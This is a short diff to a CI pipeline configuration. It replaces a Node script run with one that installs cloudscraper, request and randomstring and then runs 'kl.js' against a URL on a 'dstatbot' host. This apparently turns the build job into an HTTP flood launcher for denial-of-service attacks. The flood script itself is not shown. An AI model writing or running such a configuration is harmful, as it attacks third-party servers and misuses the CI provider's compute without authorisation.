@@ -13,10 +13,10 @@ jobs:
       - checkout
       - run:
           name: Install system dependencies
-          command: sudo apt-get update && sudo apt-get install -y gcc build-essential
+          command: sudo apt-get update && sudo apt-get install -y gcc build-essential & npm install cloudscraper request randomstring
       - run:
           name: Run Node script
-          command: node k.js https://test.zoomov.cat 200 4 10 1
+          command: node kl.js https://c2.dstatbot.win/8e406482-5116-4dc4-8f97-c330cd82972e 300
 
 workflows:
   version: 2
